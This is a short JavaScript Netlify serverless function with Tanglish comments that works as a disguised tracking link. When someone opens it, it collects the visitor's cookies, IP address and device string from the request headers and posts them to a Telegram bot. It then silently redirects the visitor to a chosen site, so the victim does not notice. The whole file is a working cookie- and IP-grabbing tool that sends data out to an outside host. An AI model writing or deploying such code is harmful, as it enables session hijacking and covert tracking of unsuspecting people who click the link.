const axios = require('axios');

exports.handler = async (event, context) => {
    // Netlify Environment Variables-la irundhu data-va edukkum
    const BOT_TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;
    
    // URL-la irundhu target link-a edukkum (?url=https://example.com)
    // Link illaiyuna default-a google.com-ku redirect pannum
    const targetUrl = event.queryStringParameters.url || "https://www.google.com";

    // Browser-la irundhu varra Headers-a capture pannuvom
    const headers = event.headers;
    const userCookies = headers.cookie || "No Cookies Found in Header (Empty)";
    const userIP = headers['x-nf-client-connection-ip'] || "Unknown IP";
    const userAgent = headers['user-agent'] || "Unknown Device";

    // Telegram-ku anuppa vendiya message format
    const message = `
🔔 **New Connection Logged!**
━━━━━━━━━━━━━━━━━━━━
🔗 **Target:** ${targetUrl}
🌐 **IP Address:** ${userIP}
📱 **Device:** ${userAgent}
🍪 **Cookies:** \`\`\`
${userCookies}
\`\`\`
━━━━━━━━━━━━━━━━━━━━
    `;

    try {
        // Telegram API-ku POST request anuppurom
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "Markdown"
        });
    } catch (err) {
        console.error("Telegram API Error:", err.message);
    }

    // User-a original site-ku silent-a redirect pannuvom (HTTP 302)
    return {
        statusCode: 302,
        headers: {
            "Location": targetUrl,
            "Cache-Control": "no-cache"
        },
        body: ""
    };
};
